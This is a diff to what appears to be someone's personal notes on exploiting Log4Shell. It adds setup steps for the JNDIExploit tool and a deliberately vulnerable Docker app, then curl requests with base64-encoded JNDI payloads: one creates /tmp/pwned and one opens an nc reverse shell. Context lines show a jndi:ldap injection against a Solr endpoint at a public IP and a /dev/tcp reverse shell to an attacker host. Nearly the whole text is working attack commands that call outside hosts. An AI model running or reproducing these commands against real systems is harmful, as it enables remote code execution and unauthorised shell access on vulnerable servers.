@@ -2,6 +2,36 @@ curl http://143.198.145.226:8983/solr/admin/cores?foo=$\{jndi:ldap://164.92.133.
 
 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C '/bin/bash -l > /dev/tcp/164.92.133.245/9999 0<&1 2>&1' -A 164.92.133.245
 
+--------------------------------------------------------------------------------------------------------------------------------------------------
+
+sudo apt update && apt install maven docker.io python3 unzip -y
+wget https://github.com/black9/Log4shell_JNDIExploit/raw/main/JNDIExploit.v1.2.zip
+unzip JNDIExploit.v1.2.zip
+mkdir /usr/java
+cd /usr/java
+wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
+tar xzvf jdk-8u181-linux-x64.tar.gz
+update-alternatives --install /usr/bin/java java /usr/java/jdk1.8.0_181/bin/java 100
+update-alternatives --install /usr/bin/javac javac /usr/java/jdk1.8.0_181/bin/javac 100
+cd ~/
+docker run -d --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+
+
+
+10.114.0.2
+
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.114.0.2 -p 8888
+# will execute 'touch /tmp/pwned'
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://10.114.0.2:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+# REVERSE SHELL HOPEFULLY - Not working
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://10.114.0.2:1389/Basic/Command/Base64/cm0gLWYgL3RtcC87bWtub2QgL3RtcC9mIHA7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%20JjEgfCBuYyAxMC4xMTQuMC4yIDk5OTkgPi90bXAvZgo=}'
+
+
+# echo rm -f /tmp/;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1 | nc 10.114.0.2 9999 >/tmp/f | base64 | tr -d "\n" | sed -e 's/+/%20/g'
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------
+
 
 https://github.com/swisskyrepo/PayloadsAllTheThings - uprav reverse shell - /dev/bin -> a hod do echo
 
